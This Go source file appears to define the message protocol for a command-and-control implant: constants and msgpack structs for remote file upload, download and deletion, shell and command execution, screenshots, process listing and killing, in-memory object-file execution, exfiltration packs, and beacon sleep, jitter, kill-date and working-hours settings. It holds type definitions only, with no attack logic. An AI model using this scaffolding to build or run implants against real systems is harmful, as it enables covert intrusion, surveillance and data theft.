package protocol

// ─── Agent-side command & response constants ───────────────────────────────────
// These constants are used by the implant's tasks.go command dispatcher.
// They survive protocol overlay (which only replaces protocol.go).

const (
	COMMAND_UNKNOWN = 1

	INIT_PACK     = 1
	EXFIL_PACK    = 2
	JOB_PACK      = 3
	TUNNEL_PACK   = 4
	TERMINAL_PACK = 5
	BOF_PACK      = 6

	COMMAND_FS_LIST     = 10
	COMMAND_FS_UPLOAD   = 11
	COMMAND_FS_DOWNLOAD = 12
	COMMAND_FS_REMOVE   = 13
	COMMAND_FS_MKDIRS   = 14
	COMMAND_FS_COPY     = 15
	COMMAND_FS_MOVE     = 16
	COMMAND_FS_CD       = 17
	COMMAND_FS_PWD      = 18
	COMMAND_FS_CAT      = 19

	COMMAND_OS_RUN        = 20
	COMMAND_OS_INFO       = 21
	COMMAND_OS_PS         = 22
	COMMAND_OS_SCREENSHOT = 23
	COMMAND_OS_SHELL      = 24
	COMMAND_OS_KILL       = 25

	COMMAND_PROFILE_SLEEP    = 40
	COMMAND_PROFILE_KILLDATE = 41
	COMMAND_PROFILE_WORKTIME = 42

	RESP_COMPLETE      = 0
	RESP_ERROR         = 1
	RESP_FS_LIST       = 10
	RESP_FS_UPLOAD     = 11
	RESP_FS_DOWNLOAD   = 12
	RESP_FS_PWD        = 13
	RESP_FS_CAT        = 14
	RESP_OS_RUN        = 20
	RESP_OS_INFO       = 21
	RESP_OS_PS         = 22
	RESP_OS_SCREENSHOT = 23
	RESP_OS_SHELL      = 24
)

type StartMsg struct {
	Type int    `msgpack:"id"`
	Data []byte `msgpack:"data"`
}

type InitPack struct {
	Id   uint   `msgpack:"id"`
	Type uint   `msgpack:"type"`
	Data []byte `msgpack:"data"`
}

// ─── Agent-side types ──────────────────────────────────────────────────────────
// Used by impl/ interfaces and tasks.go dispatcher. These are shared across all
// protocol overlays and must not be redefined in types.go.tmpl.

type DirEntry struct {
	Name    string `msgpack:"name"`
	IsDir   bool   `msgpack:"is_dir"`
	Size    int64  `msgpack:"size"`
	ModTime int64  `msgpack:"mod_time"`
}

type ProcessEntry struct {
	Pid     uint32 `msgpack:"pid"`
	PPid    uint32 `msgpack:"ppid"`
	Name    string `msgpack:"name"`
	User    string `msgpack:"user"`
	Arch    string `msgpack:"arch"`
	Session uint32 `msgpack:"session"`
}

// BofMsg represents a single output callback from a BOF execution.
// Used by impl/bof_loader.go.
type BofMsg struct {
	Type int    `msgpack:"type"`
	Data []byte `msgpack:"data"`
}

// ParamsExecBof is the command payload for BOF execution.
type ParamsExecBof struct {
	Object   []byte `msgpack:"object"`
	ArgsPack string `msgpack:"argspack"`
	Task     string `msgpack:"task"`
}

// AnsExecBof is the response for synchronous BOF execution.
type AnsExecBof struct {
	Msgs []byte `msgpack:"msgs"`
}

// AnsExecBofAsync is the response for asynchronous BOF execution.
type AnsExecBofAsync struct {
	Msgs   []byte `msgpack:"msgs"`
	Start  bool   `msgpack:"start"`
	Finish bool   `msgpack:"finish"`
}

// ─── File system request params ────────────────────────────────────────────────

type ParamsExit struct{}

type ParamsFsList struct {
	Path string `msgpack:"path"`
}

type ParamsFsUpload struct {
	Path string `msgpack:"path"`
	Data []byte `msgpack:"data"`
}

type ParamsFsDownload struct {
	Path string `msgpack:"path"`
}

type ParamsFsRemove struct {
	Path string `msgpack:"path"`
}

type ParamsFsMkdirs struct {
	Path string `msgpack:"path"`
}

type ParamsFsCopy struct {
	Src string `msgpack:"src"`
	Dst string `msgpack:"dst"`
}

type ParamsFsMove struct {
	Src string `msgpack:"src"`
	Dst string `msgpack:"dst"`
}

type ParamsFsCd struct {
	Path string `msgpack:"path"`
}

type ParamsFsCat struct {
	Path string `msgpack:"path"`
}

// ─── OS request params ─────────────────────────────────────────────────────────

type ParamsOsRun struct {
	Command string `msgpack:"command"`
	Output  bool   `msgpack:"output"`
	Wait    bool   `msgpack:"wait"`
}

type ParamsOsInfo struct{}

type ParamsOsPs struct{}

type ParamsOsScreenshot struct{}

type ParamsOsShell struct {
	Command string `msgpack:"command"`
}

type ParamsOsKill struct {
	Pid uint32 `msgpack:"pid"`
}

// ─── Profile tuning request params ─────────────────────────────────────────────

type ParamsProfileSleep struct {
	Sleep  int `msgpack:"sleep"`
	Jitter int `msgpack:"jitter"`
}

type ParamsProfileKilldate struct {
	KillDate int64 `msgpack:"kill_date"`
}

type ParamsProfileWorktime struct {
	WorkStart int `msgpack:"work_start"`
	WorkEnd   int `msgpack:"work_end"`
}

// ─── File system response types ────────────────────────────────────────────────

type AnsFsList struct {
	Path    string     `msgpack:"path"`
	Entries []DirEntry `msgpack:"entries"`
}

type AnsFsUpload struct {
	Path string `msgpack:"path"`
}

type AnsFsDownload struct {
	Path string `msgpack:"path"`
	Data []byte `msgpack:"data"`
}

type AnsFsPwd struct {
	Path string `msgpack:"path"`
}

type AnsFsCat struct {
	Content string `msgpack:"content"`
}

// ─── OS response types ─────────────────────────────────────────────────────────

type AnsOsRun struct {
	Output string `msgpack:"output"`
}

type AnsOsShell struct {
	Output string `msgpack:"output"`
}

type AnsOsInfo struct {
	Hostname    string `msgpack:"hostname"`
	Username    string `msgpack:"username"`
	Domain      string `msgpack:"domain"`
	InternalIP  string `msgpack:"internal_ip"`
	Os          string `msgpack:"os"`
	OsVersion   string `msgpack:"os_version"`
	OsArch      string `msgpack:"os_arch"`
	Elevated    bool   `msgpack:"elevated"`
	ProcessId   uint32 `msgpack:"process_id"`
	ProcessName string `msgpack:"process_name"`
	CodePage    uint32 `msgpack:"code_page"`
}

type AnsOsPs struct {
	Processes []ProcessEntry `msgpack:"processes"`
}

type AnsOsScreenshot struct {
	Image []byte `msgpack:"image"`
}
